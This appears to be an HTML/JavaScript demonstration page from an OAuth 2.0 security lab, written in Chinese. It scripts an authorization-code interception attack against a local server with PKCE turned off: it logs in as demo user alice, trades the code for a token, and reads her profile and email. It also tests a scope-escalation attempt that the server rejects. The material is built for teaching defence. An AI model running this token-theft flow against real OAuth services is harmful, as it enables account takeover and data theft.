@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>OAuth 攻击复现面板</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif; background: #0d1117; color: #c9d1d9; padding: 30px; }
+  h1 { color: #58a6ff; margin-bottom: 5px; font-size: 22px; }
+  .subtitle { color: #8b949e; margin-bottom: 25px; font-size: 13px; }
+  .panel { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
+  .panel h2 { font-size: 16px; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+  .badge { padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; }
+  .badge-danger { background: #da3633; color: #fff; }
+  .badge-success { background: #238636; color: #fff; }
+  .badge-warn { background: #d29922; color: #000; }
+  button { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; margin: 4px 6px 4px 0; font-family: inherit; }
+  .btn-go { background: #238636; color: #fff; }
+  .btn-go:hover { background: #2ea043; }
+  .btn-attack { background: #da3633; color: #fff; }
+  .btn-attack:hover { background: #f85149; }
+  .btn-big { font-size: 17px; padding: 14px 30px; }
+  pre { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
+    padding: 14px; color: #7ee787; font-family: 'Cascadia Code', 'Consolas', monospace; font-size: 12px;
+    margin-top: 10px; white-space: pre-wrap; word-break: break-all; min-height: 50px; max-height: 350px; overflow-y: auto; }
+  .step { margin: 8px 0; padding: 8px 12px; background: #0d1117; border-radius: 4px; border-left: 4px solid #30363d; font-size: 13px; }
+  .step.attack { border-left-color: #da3633; }
+  .result { margin-top: 10px; padding: 12px; border-radius: 4px; font-size: 13px; }
+  .result.success { background: #0d3320; border: 1px solid #238636; color: #7ee787; }
+  .result.fail { background: #3d1a1a; border: 1px solid #da3633; color: #f85149; }
+  .tip { background: #1a2332; border: 1px solid #1f6feb; border-radius: 6px; padding: 12px; margin: 10px 0; font-size: 13px; color: #79c0ff; }
+</style>
+</head>
+<body>
+
+<h1>⚔️ OAuth 2.0 攻击复现面板</h1>
+<p class="subtitle">当前: ENABLE_PKCE=False | 攻击可通过浏览器直接复现</p>
+
+<!-- ========== 攻击一：授权码截获 ========== -->
+<div class="panel">
+  <h2>
+    攻击一：授权码截获
+    <span class="badge badge-danger">PKCE=OFF → 可攻击</span>
+  </h2>
+
+  <div class="step">步骤1: 正常用户 alice 登录 → 获取 authorization_code</div>
+  <button class="btn-go" onclick="step1()">① Alice 登录，截获 code</button>
+  <pre id="log1">等待执行...</pre>
+
+  <div class="step attack">⚔️ 步骤2: 攻击者用截获的 code 换 token（不传 code_verifier）</div>
+  <button class="btn-attack" onclick="step2()">② 用 code 换 token</button>
+  <pre id="log2">等待执行...</pre>
+
+  <div class="step attack">⚔️ 步骤3: 攻击者用窃取的 token 访问 Alice 的资源</div>
+  <button class="btn-attack" onclick="step3('profile')">③ 访问 /profile</button>
+  <button class="btn-attack" onclick="step3('email')">③ 访问 /email</button>
+  <pre id="log3">等待执行...</pre>
+</div>
+
+<!-- ========== 一键攻击 ========== -->
+<div class="panel">
+  <h2>🚀 一键完整攻击</h2>
+  <button class="btn-attack btn-big" onclick="fullAttack()">⚔️ 执行完整授权码截获攻击</button>
+  <pre id="logFull">点击按钮开始...</pre>
+</div>
+
+<!-- ========== 攻击二：Scope滥用 ========== -->
+<div class="panel">
+  <h2>
+    攻击二：Scope 权限滥用
+    <span class="badge badge-warn">Alice 申请管理员权限</span>
+  </h2>
+  <button class="btn-attack" onclick="scopeAbuse()">⚔️ Alice 申请 admin:panel → 尝试访问 /admin</button>
+  <pre id="logScope">等待执行...</pre>
+</div>
+
+<script>
+// 所有请求都发给同源的 client_app (:8001)，彻底避免跨域问题
+const BASE = '';  // 同源
+
+let capturedCode = null;
+let stolenToken = null;
+
+async function step1() {
+  const el = document.getElementById('log1');
+  el.textContent = '⏳ Alice 正在登录...';
+  try {
+    const resp = await fetch(BASE + '/attack-proxy/authorize', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        username: 'alice',
+        password: 'alice123',
+        scope: 'read:profile read:email'
+      })
+    });
+    const data = await resp.json();
+    if (resp.ok) {
+      capturedCode = data.code;
+      el.textContent = `✅ Alice 登录成功！\n\n截获的 authorization_code:\n${capturedCode}\n\n⚠️ 攻击者拿到了这个code，可以换token！`;
+    } else {
+      el.textContent = `❌ 登录失败: ${JSON.stringify(data)}`;
+    }
+  } catch(e) {
+    el.textContent = `❌ 网络错误: ${e.message}`;
+  }
+}
+
+async function step2() {
+  const el = document.getElementById('log2');
+  if (!capturedCode) { el.textContent = '❌ 请先执行步骤1'; return; }
+  el.textContent = '⏳ 攻击者正在用截获的code换token...（注意：没有code_verifier！）';
+  try {
+    const resp = await fetch(BASE + '/attack-proxy/token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ code: capturedCode })
+    });
+    const data = await resp.json();
+    if (resp.ok) {
+      stolenToken = data.access_token;
+      el.textContent = `🔴 攻击成功！换到了 access_token！\n\nToken状态: 200\nScope: ${data.scope}\nToken前60字符: ${stolenToken.substring(0, 60)}...\n\n⚠️ 攻击者冒充了Alice的身份！`;
+    } else {
+      el.textContent = `✅ 防御成功！/token 返回错误:\n${JSON.stringify(data, null, 2)}\n\n说明PKCE或其他防御阻止了攻击。`;
+    }
+  } catch(e) {
+    el.textContent = `❌ 网络错误: ${e.message}`;
+  }
+}
+
+async function step3(path) {
+  const el = document.getElementById('log3');
+  if (!stolenToken) { el.textContent = '❌ 请先执行步骤2获取token'; return; }
+  el.textContent = `⏳ 攻击者正在访问 /${path}...`;
+  try {
+    const resp = await fetch(BASE + `/attack-proxy/resource?path=/${path}&access_token=${encodeURIComponent(stolenToken)}`);
+    const data = await resp.json();
+    if (data.status === 200) {
+      el.textContent = `🔴 攻击成功！\n/${path} 返回 ${data.status}\n\n${data.body}\n\n攻击者成功获取了Alice的${path === 'profile' ? '个人资料' : '邮箱'}！`;
+    } else {
+      el.textContent = `✅ 防御成功！\n/${path} 返回 ${data.status}\n\n${data.body}`;
+    }
+  } catch(e) {
+    el.textContent = `❌ 网络错误: ${e.message}`;
+  }
+}
+
+async function fullAttack() {
+  const el = document.getElementById('logFull');
+  el.textContent = '🚀 开始完整攻击流程...\n\n';
+
+  // Step 1
+  el.textContent += '[1/3] Alice 登录，截获 code...\n';
+  const r1 = await fetch(BASE + '/attack-proxy/authorize', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({ username: 'alice', password: 'alice123', scope: 'read:profile read:email' })
+  });
+  const d1 = await r1.json();
+  el.textContent += `      ✅ code = ${d1.code.substring(0, 40)}...\n\n`;
+
+  // Step 2
+  el.textContent += '[2/3] ⚔️ 攻击者用code换token（无code_verifier）...\n';
+  const r2 = await fetch(BASE + '/attack-proxy/token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({ code: d1.code })
+  });
+  if (!r2.ok) {
+    el.textContent += `      ✅ 防御成功！/token 返回 ${r2.status}\n`;
+    return;
+  }
+  const d2 = await r2.json();
+  const token = d2.access_token;
+  el.textContent += `      🔴 换到了token！（scope: ${d2.scope}）\n\n`;
+
+  // Step 3
+  el.textContent += '[3/3] ⚔️ 攻击者用窃取的token访问资源...\n';
+  for (const path of ['/profile', '/email']) {
+    const r3 = await fetch(BASE + `/attack-proxy/resource?path=${path}&access_token=${encodeURIComponent(token)}`);
+    const d3 = await r3.json();
+    const icon = d3.status === 200 ? '🔴' : '✅';
+    el.textContent += `      ${icon} ${path}: ${d3.status} → ${d3.body.substring(0, 80)}\n`;
+  }
+
+  el.textContent += '\n' + '═'.repeat(55) + '\n';
+  el.textContent += '🔴 攻击完全成功！\n';
+  el.textContent += '攻击者没有Alice的密码，但成功：\n';
+  el.textContent += '  1. 截获了 authorization_code\n';
+  el.textContent += '  2. 换取了 access_token\n';
+  el.textContent += '  3. 访问了Alice的个人资料和邮箱\n';
+  el.textContent += '\n原因: ENABLE_PKCE=False → /token 不验证 code_verifier';
+}
+
+async function scopeAbuse() {
+  const el = document.getElementById('logScope');
+  el.textContent = '⏳ Alice 正在尝试申请 admin:panel 权限...\n\n';
+
+  // Step 1: Alice logs in but requests admin:panel
+  el.textContent += '[1] Alice 登录，故意申请 admin:panel scope...\n';
+  const r1 = await fetch(BASE + '/attack-proxy/authorize', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({
+      username: 'alice', password: 'alice123',
+      scope: 'read:profile read:email admin:panel'
+    })
+  });
+  const d1 = await r1.json();
+
+  // Step 2: Exchange for token
+  el.textContent += '[2] 用code换token...\n';
+  const r2 = await fetch(BASE + '/attack-proxy/token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({ code: d1.code })
+  });
+  const d2 = await r2.json();
+
+  el.textContent += `    请求的scope: read:profile read:email admin:panel\n`;
+  el.textContent += `    实际granted:  ${d2.scope}\n`;
+  el.textContent += `    ⚠️ admin:panel 被裁剪掉了！（第一道防线: _clip_scope）\n\n`;
+
+  // Step 3: Try to access /admin
+  el.textContent += '[3] 尝试访问 /admin...\n';
+  const r3 = await fetch(BASE + `/attack-proxy/resource?path=/admin&access_token=${encodeURIComponent(d2.access_token)}`);
+  const d3 = await r3.json();
+  el.textContent += `    /admin: ${d3.status} → ${d3.body}\n\n`;
+
+  if (d3.status === 403) {
+    el.textContent += '✅ 防御成功！\n';
+    el.textContent += '第一道防线: auth_server裁剪scope（取交集）\n';
+    el.textContent += '第二道防线: resource_server双重校验 role + scope\n';
+  } else {
+    el.textContent += '🔴 攻击成功！（不应该发生的）\n';
+  }
+}
+</script>
+
+</body>
+</html>
